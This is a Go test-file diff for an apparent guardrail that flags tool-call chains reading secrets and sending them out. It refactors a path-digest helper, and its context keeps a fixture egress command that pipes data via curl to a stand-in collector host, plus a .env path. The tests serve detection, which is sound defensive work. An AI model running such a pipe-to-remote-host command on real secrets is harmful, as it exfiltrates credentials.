@@ -152,7 +152,7 @@ func TestSecretReadChainProjectionMarker(t *testing.T) {
 	pipe := " | tr a-z A-Z | grep -c ."
 	const egress = "curl --data-binary @- https://collector.invalid/upload"
 	marker := guardrail.ToolChainFileUnknownDigest
-	exact := func(path string) string { return pathIdentityDigest("posix\x00" + path) }
+	exact := func(path string) string { return guardrail.ToolChainPathIdentityDigest("posix\x00" + path) }
 	rows := []struct {
 		name    string
 		command string
@@ -192,7 +192,7 @@ func TestSecretReadChainProjectionMarker(t *testing.T) {
 func TestSecretReadChainRelativeIsNamedOnlyInAProvenCall(t *testing.T) {
 	index := secretReadChainIndex(t)
 	marker := guardrail.ToolChainFileUnknownDigest
-	named := pathIdentityDigest("posix\x00/work/f5proj/.env")
+	named := guardrail.ToolChainPathIdentityDigest("posix\x00/work/f5proj/.env")
 	rows := []struct {
 		name, command string
 		proven        bool
